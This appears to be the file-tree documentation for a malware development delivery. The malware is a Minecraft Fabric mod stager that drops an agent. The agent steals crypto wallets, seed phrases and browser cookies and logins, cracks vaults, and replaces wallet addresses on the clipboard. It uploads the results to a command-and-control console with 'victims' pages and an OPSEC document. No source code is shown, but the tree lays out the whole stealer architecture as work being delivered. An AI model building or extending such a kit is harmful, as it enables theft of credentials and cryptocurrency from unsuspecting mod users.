# Repository tree (deliverable)

Paths marked `new` are added by this delivery. Existing mod files are untouched
except the dispatcher, the poller hook, the agent bootstrap and three visibility
changes (`AddressValidator`, `ClipboardPolicy`, `SecretDetector`, `Dpapi`).

```
contract/v1/                          new
  CONTRACT.md                         frozen wire contract
  openapi.yaml                        endpoints and error codes
  task-schemas.json                   per-task params/result schema
  container.schema.json               manifest schema

docs/
  COVERAGE.md                         new  wallet/extension matrix
  PATHS.md                            new  per-OS path table
  KNOWN_ERRORS.md                     new  failures + mitigations
  TREE.md                             new  this file
  OPSEC.md                            existing

src/                                  Fabric loader/stager (existing)
  main/java/com/serverpackcore/...    mixin + stager
  main/resources/serverpackcore/agent.bin

agent/
  src/main/java/com/spcagentpayloa/jvmxx/
    Agent.java                        + startCrypto / stopCrypto
    Poller.java                       + crypto field, startCrypto, submitCrypto
    CommandExecutor.java              + scan_wallets, dump_vault, crack_vault,
                                        clip_start, clip_stop, crypto
    AddressValidator.java             visibility: public
    ClipboardPolicy.java              visibility: public + public Decision
    SecretDetector.java               visibility: public
    Dpapi.java                        + LocalMachine scope
    crypto/                           new package
      CryptoConfig.java               injected profile parser
      CryptoLog.java                  AES-GCM local rolling log
      CryptoPaths.java                per-OS roots and target catalog
      CryptoUtil.java                 PBKDF2/HKDF/GCM/CBC/deflate
      VaultV3.java                    vault v3 decrypt + fixture seal
      VaultCracker.java               bounded dictionary (vault + Electrum)
      Sqlite.java                     minimal read-only SQLite b-tree
      Firefox.java                    NSS PBES2 master key + cookies/logins
      Chromium.java                   DPAPI/ABE key + cookie/login decrypt
      CredentialDump.java             copy-before-read credential dump
      SeedScanner.java                BIP39 checksum + hex/WIF/xprv scan
      DesktopWallets.java             desktop discovery + Electrum/Exodus
      ClipboardWatcher.java           persistent monitor + replacement
      ArtifactPack.java               manifest + Deflate + AES-GCM container
      CryptoTransport.java            signed HTTPS, DoH pinning, backoff
      CryptoModule.java               executor, handlers, upload resume
  src/test/java/.../crypto/           new synthetic fixtures
    VaultV3Test.java
    SeedScannerTest.java
    ChromiumTest.java

console/                              new
  package.json  next.config.mjs  tailwind.config.ts  postcss.config.mjs
  tsconfig.json  Dockerfile  docker-compose.yml  Caddyfile  .env.example
  README.md  OVERVIEW.md  SECURITY.md  docker-entrypoint.sh
  scripts/smoke.sh
  prisma/
    schema.prisma
    seed.ts
    migrations/20260101000000_init/migration.sql
    migrations/migration_lock.toml
  server/
    index.ts  worker.ts
    tsconfig.json
    lib/{env,crypto,db,audit,password,totp,jwt,ip,geo,bus,nonce,errors}.ts
    plugins/{auth,victim-auth}.ts
    routes/{auth,agent,victims,tasks,builds,misc}.ts
    services/{artifact,notify,build}.ts
  src/
    app/{layout.tsx,page.tsx,globals.css}
    app/login/page.tsx
    app/(console)/layout.tsx
    app/(console)/dashboard/page.tsx
    app/(console)/victims/page.tsx
    app/(console)/victims/[id]/page.tsx
    app/(console)/tasks/page.tsx
    app/(console)/builds/page.tsx
    app/(console)/events/page.tsx
    app/(console)/logs/page.tsx
    app/(console)/audit/page.tsx
    app/(console)/operators/page.tsx
    app/(console)/settings/page.tsx
    components/ui/{button,input,card,badge,table,tabs,dialog,dropdown,tooltip}.tsx
    components/{sidebar,topbar,live-provider,counters,world-map,leaflet-map,
                event-feed,victim-filters,victim-table,task-dialog,task-list,
                wallet-table,file-tree,console-panel}.tsx
    hooks/{useApi,useLive,useHotkeys}.ts
    lib/{api,cn,format,types}.ts
```

## Runtime volumes

```
/data/artifacts        uploads and extracted blobs (never public)
/data/builds           compiled jars
/app/logs              api.log, worker output
postgres volume        relational state
redis volume           nonces, pub/sub (optional)
```

## Jar growth

Measured with the same JDK and offline cache: HEAD jar 1,650,148 B, delivered jar
1,764,513 B — **+111.7 KiB**, well under the +400 KB budget. No new dependency is
declared. The jar is reproducible (`preserveFileTimestamps=false`).
